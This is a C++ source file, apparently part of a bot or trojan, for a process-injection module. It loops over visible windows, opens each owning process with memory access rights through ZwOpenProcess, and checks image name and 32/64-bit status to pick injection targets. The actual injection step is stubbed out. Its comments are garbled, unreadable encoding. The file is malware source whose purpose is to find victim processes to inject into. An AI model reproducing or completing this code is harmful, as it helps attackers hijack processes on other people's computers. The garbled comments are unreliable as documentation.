//---------------------------------------------------------------------------

#pragma hdrstop

#include "AppInjector.h"
#include "BotCore.h"
#include "Inject.h"
#include "WndUtils.h"
#include "Utils.h"
//---------------------------------------------------------------------------

namespace INJECTOR
{
	typedef struct TInjector
	{
		bool      IsWin64;  // ������� ����, ��� ������� �������� � 64 ������ ����
		TBotList* Injected; // ������ ���������, � ������� ��� �������� ������
	} *PInjector;


	typedef struct TProcessInfo
	{
		DWORD    PID;
		BOOL     IsWOW64;
		wstring  ExeName;
	} *PProcessInfo;



	DWORD WINAPI InjectorProc(LPVOID);
	BOOL CALLBACK WndEnumCallBak(HWND Wnd, LPARAM Param);
	bool GetProcessInfo(DWORD PID, TProcessInfo &Info);
}


//------------------------------------------------------
//  StartInjector - ������� �������� ������� ���������
//------------------------------------------------------
void StartInjector()
{
	StartThread(INJECTOR::InjectorProc, NULL);
//	MegaJump(IJECTOR::InjectorProc);
}



//------------------------------------------------------
//  InjectorProc - �������� ������� ���������, �������
//                 ��������� ��������� ���������� ��������
//------------------------------------------------------
DWORD WINAPI INJECTOR::InjectorProc(LPVOID)
{
	// �������� ������ ���������:
	// ���������� ��� ��� �������� ����� � ����������
	// � ������ ���������
	BOT::Initialize();

	TInjector Injector;
	Injector.IsWin64  = IsWIN64();
    Injector.Injected = new TBotList();

	while (!BOT::Terminated())
	{
		// ���������� ������� ���� ����
		pEnumWindows(WndEnumCallBak, &Injector);
		pSleep(1000);
	}

	// ��� ���������� ������ ������� �� ��������
	pExitProcess(0);
	return 0;
}

//------------------------------------------------------
// GetProcessInfo - ������� ������� ���������� � �������
//------------------------------------------------------
bool INJECTOR::GetProcessInfo(DWORD PID, TProcessInfo &Info)
{
	ClearStruct(Info);
	Info.PID = PID;
	// ��������� �������
	CLIENT_ID ClientID;
	ClientID.UniqueProcess = (HANDLE)PID;
	ClientID.UniqueThread  = 0;

    OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(ObjectAttributes) } ;

	HANDLE Process;
	if (pZwOpenProcess(&Process,  PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &ObjectAttributes, &ClientID) != STATUS_SUCCESS)
		return false;

	// ���������� �� ������� �������
	pIsWow64Process(Process, &Info.IsWOW64);

	// �������� ��� ��������
	TMemory Buf((MAX_PATH + 1) * sizeof(WCHAR) + sizeof(UNICODE_STRING));

	PCHAR Tmp = Buf.AsStr();
	PUNICODE_STRING Str = (PUNICODE_STRING)Tmp;
	Str->Length = 0;
	Str->MaximumLength = MAX_PATH * sizeof(wchar_t);

	Tmp += sizeof(UNICODE_STRING);

	Str->Buffer = (PWSTR)Tmp;
	ULONG Len = Str->MaximumLength;

	if(pZwQueryInformationProcess(Process, ProcessImageFileName, Str, Len, &Len) == STATUS_SUCCESS)
	{
		// ������� �������� ��� ��������
		Info.ExeName = Str->Buffer;
	}


	// ��������� �������
	pZwClose(Process);
    return true;
}


//------------------------------------------------------
//  WndEnumCallBak - ������� ��������� ���������� ����
//------------------------------------------------------
BOOL CALLBACK INJECTOR::WndEnumCallBak(HWND Wnd, LPARAM Param)
{
	// ���� ������ ���� ������� � �� ����� ���������
	if (pIsWindowVisible(Wnd) && !pGetWindow(Wnd, GW_OWNER))
	{
		// �������� ��� ������ �������� ����������� ����
		DWORD PID = 0;
		pGetWindowThreadProcessId(Wnd, &PID);
		if (PID)
		{
			string Text = GetWndText2(Wnd);

			PInjector Injector = (PInjector)Param;

			TProcessInfo Info;
			GetProcessInfo(PID, Info);

			// ��������� ������������� �������
			// ��������� ������ � 32 ��������� ����� ��� � 32 ��������� ��������
			bool CanInject = !Injector->IsWin64 || IsWOW64(PID);

			//��������� �� ����������� �� � ������ �������
			if (CanInject)
				CanInject = false;

        }
    }

	return TRUE;
}
